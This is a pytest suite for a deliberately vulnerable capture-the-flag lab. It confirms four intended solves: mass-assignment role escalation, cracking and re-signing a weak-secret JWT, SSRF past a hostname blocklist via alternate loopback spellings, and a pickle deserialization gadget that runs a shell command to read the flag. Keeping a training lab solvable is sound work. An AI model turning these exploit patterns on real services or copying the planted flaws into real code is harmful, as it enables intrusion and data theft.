"""The four intended solutions, each end to end (spec 047).

A challenge image is only as good as its challenges still being solvable. Each
test below solves one the way the published hints describe — except the boss,
which has no hints, and is solved the way the spec says it must be.
"""

from __future__ import annotations

import base64
import json
import pickle  # noqa: S403 - building the boss payload is the point

import jwt
import pytest

from tests.conftest import (
    DEMO_PASSWORD,
    DEMO_USER,
    LOOPBACK_SPELLINGS,
    MINTED,
    SIGNED_FLAG_OWNER,
    auth,
    fetch_through_api,
    can_reach,
    submit_job,
    token_for,
)

class TestPromoted:
    """medium — mass assignment. Read every field, then send one back."""

    def test_the_profile_exposes_the_role(self, client) -> None:
        """The hint tells the player to look at every field, so it has to be there."""
        token = token_for(client)

        profile = client.get("/api/profile", headers=auth(token)).get_json()

        assert profile["role"] == "clerk"
        assert "password" not in profile

    def test_binding_role_promotes_the_caller(self, client) -> None:
        token = token_for(client)

        refused = client.get("/api/admin/audit", headers=auth(token))
        assert refused.status_code == 403

        client.patch("/api/profile", json={"role": "admin"}, headers=auth(token))
        allowed = client.get("/api/admin/audit", headers=auth(token))

        assert allowed.status_code == 200
        assert allowed.get_json()["audit_note"] == MINTED["promoted"]

    def test_an_ordinary_update_still_works(self, client) -> None:
        token = token_for(client)

        updated = client.patch(
            "/api/profile", json={"department": "Archive"}, headers=auth(token)
        )

        assert updated.get_json()["department"] == "Archive"
        assert updated.get_json()["role"] == "clerk"


class TestSignedByMe:
    """hard — JWT forgery. The secret is in any ordinary wordlist."""

    def test_the_token_is_hs256_and_readable(self, client) -> None:
        """The first hint: three segments, the middle one your identity."""
        token = token_for(client)

        header = jwt.get_unverified_header(token)
        claims = jwt.decode(token, options={"verify_signature": False})

        assert header["alg"] == "HS256"
        assert claims["sub"] == DEMO_USER

    def test_the_secret_is_weak_enough_to_crack(self, client) -> None:
        """Stands in for hashcat: the secret must be in an ordinary wordlist."""
        token = token_for(client)
        wordlist = ["letmein", "secret", "changeme", "password123", "hunter2"]

        cracked = None
        for candidate in wordlist:
            try:
                jwt.decode(token, candidate, algorithms=["HS256"])
            except jwt.PyJWTError:
                continue
            cracked = candidate
            break

        assert cracked is not None, "the signing secret is not in an ordinary wordlist"

    def test_a_resigned_token_becomes_another_user(self, client) -> None:
        token = token_for(client)
        claims = jwt.decode(token, options={"verify_signature": False})
        claims["sub"] = SIGNED_FLAG_OWNER
        forged = jwt.encode(claims, "changeme", algorithm="HS256")

        records = client.get("/api/records/mine", headers=auth(forged)).get_json()

        bodies = " ".join(record["body"] for record in records["records"])
        assert MINTED["signed-by-me"] in bodies

    def test_alg_none_is_refused(self, client) -> None:
        """Only one of the hint's two routes is real, and this is the other one.

        Left as a test rather than a footnote: if somebody later "fixes" PyJWT
        usage in a way that starts accepting unsigned tokens, challenge 2 stops
        being worth 225 XP and this is what says so.
        """
        forged = jwt.encode({"sub": SIGNED_FLAG_OWNER, "role": "admin"}, key="", algorithm="none")

        refused = client.get("/api/records/mine", headers=auth(forged))

        assert refused.status_code == 401


class TestFetchItForMe:
    """very hard — SSRF. The filter is a list of hostnames, not addresses."""

    def test_the_blocklist_refuses_the_obvious_spellings(self, client, port) -> None:
        token = token_for(client)

        for host in ("localhost", "127.0.0.1"):
            refused = fetch_through_api(client, token, f"http://{host}:{port}/")
            assert refused.status_code == 400, host
            assert "not permitted" in refused.get_json()["error"]

    @pytest.mark.parametrize("spelling", LOOPBACK_SPELLINGS)
    def test_every_other_spelling_reaches_the_service(self, client, port, spelling) -> None:
        if not can_reach(spelling, port):
            pytest.skip(f"this machine cannot reach loopback as {spelling!r}; the container can")
        token = token_for(client)

        reached = fetch_through_api(client, token, f"http://{spelling}:{port}/")

        assert reached.status_code == 200, reached.get_json()
        body = json.loads(reached.get_json()["body"])
        assert "maintenance" in body["service"]

    def test_the_service_identifies_itself_and_names_the_flag_path(self, client, port, loopback) -> None:
        """The second hint promises it identifies itself as soon as you reach it."""
        token = token_for(client)

        body = json.loads(
            fetch_through_api(client, token, f"http://{loopback}:{port}/").get_json()["body"]
        )

        assert "GET /status/flag" in body["endpoints"]

    def test_a_plain_get_is_enough_for_the_flag(self, client, port, loopback) -> None:
        """Challenge 3 completes on its own; the boss is a separate step."""
        token = token_for(client)

        fetched = fetch_through_api(client, token, f"http://{loopback}:{port}/status/flag")

        assert fetched.status_code == 200
        assert MINTED["fetch-it-for-me"] in fetched.get_json()["body"]


class TestNoRouteToIt:
    """nearly impossible — the area boss. No hints, and none implied here."""

    def _admin_token(self, client) -> str:
        """Either earlier challenge gets you this; promotion is the shorter road."""
        token = token_for(client)
        client.patch("/api/profile", json={"role": "admin"}, headers=auth(token))
        return token_for(client, DEMO_USER, DEMO_PASSWORD)

    def test_the_job_endpoint_wants_an_administrator(self, client, port, loopback) -> None:
        token = token_for(client)

        refused = submit_job(client, token, f"http://{loopback}:{port}/jobs", "Zm9v")

        assert json.loads(refused.get_json()["body"])["error"].startswith("An administrator")

    def test_a_pickle_gadget_runs_and_reads_the_flag(self, client, port, registry, loopback) -> None:
        """The intended solve: a gadget that executes on unpickling."""
        _, _, flags_module, _ = registry

        class Gadget:
            def __reduce__(self):
                import subprocess

                return (
                    subprocess.check_output,
                    (["cat", flags_module.BOSS_FLAG_PATH],),
                )

        payload = base64.b64encode(pickle.dumps(Gadget())).decode()
        admin = self._admin_token(client)

        submitted = submit_job(client, admin, f"http://{loopback}:{port}/jobs", payload)

        assert submitted.status_code == 200, submitted.get_json()
        result = json.loads(submitted.get_json()["body"])
        assert result["accepted"] is True
        assert MINTED["no-route-to-it"] in result["result"]

    def test_the_result_comes_back_so_execution_is_not_blind(self, client, port, loopback) -> None:
        """A boss with no hints must at least confirm the payload worked."""

        class Echo:
            def __reduce__(self):
                return (str, ("gadget executed",))

        payload = base64.b64encode(pickle.dumps(Echo())).decode()
        admin = self._admin_token(client)

        submitted = submit_job(client, admin, f"http://{loopback}:{port}/jobs", payload)

        assert "gadget executed" in json.loads(submitted.get_json()["body"])["result"]


class TestTheFourAreDistinct:
    def test_no_earlier_solve_hands_over_a_later_flag(self, client, port, loopback) -> None:
        """The boss reaches everything — it is command execution, and it is last.

        Everything below it must not. These are the responses a player actually
        receives from challenges 1 to 3.
        """
        token = token_for(client)
        client.patch("/api/profile", json={"role": "admin"}, headers=auth(token))
        admin = token_for(client)

        audit = client.get("/api/admin/audit", headers=auth(admin)).data
        fetched = fetch_through_api(
            client, admin, f"http://{loopback}:{port}/status/flag"
        ).data

        assert MINTED["no-route-to-it"].encode() not in audit
        assert MINTED["no-route-to-it"].encode() not in fetched
        assert MINTED["signed-by-me"].encode() not in audit


class TestWithoutThePlatform:
    """The image has to run, and be solvable, with no INSTANCE_ANSWERS."""

    def test_it_falls_back_to_local_flags(self, tmp_path) -> None:
        from tests.conftest import _boot

        api, _, flags_module = _boot(tmp_path, None)

        with api.app.test_client() as client:
            token = token_for(client)
            client.patch("/api/profile", json={"role": "admin"}, headers=auth(token))
            audit = client.get("/api/admin/audit", headers=auth(token)).get_json()

        assert audit["audit_note"] == flags_module.LOCAL_FALLBACK["promoted"]

    def test_a_malformed_answers_variable_does_not_stop_the_container(self, tmp_path) -> None:
        from tests.conftest import _boot

        api, _, _ = _boot(tmp_path, "{not json")

        with api.app.test_client() as client:
            assert client.get("/").status_code == 200

    def test_one_missing_key_does_not_take_the_others_down(self, tmp_path) -> None:
        from tests.conftest import _boot

        partial = {k: v for k, v in MINTED.items() if k != "no-route-to-it"}
        api, _, flags_module = _boot(tmp_path, json.dumps(partial))

        with api.app.test_client() as client:
            token = token_for(client)
            client.patch("/api/profile", json={"role": "admin"}, headers=auth(token))
            audit = client.get("/api/admin/audit", headers=auth(token)).get_json()

        assert audit["audit_note"] == MINTED["promoted"]
        with open(flags_module.BOSS_FLAG_PATH, encoding="utf-8") as handle:
            assert handle.read().strip() == flags_module.LOCAL_FALLBACK["no-route-to-it"]
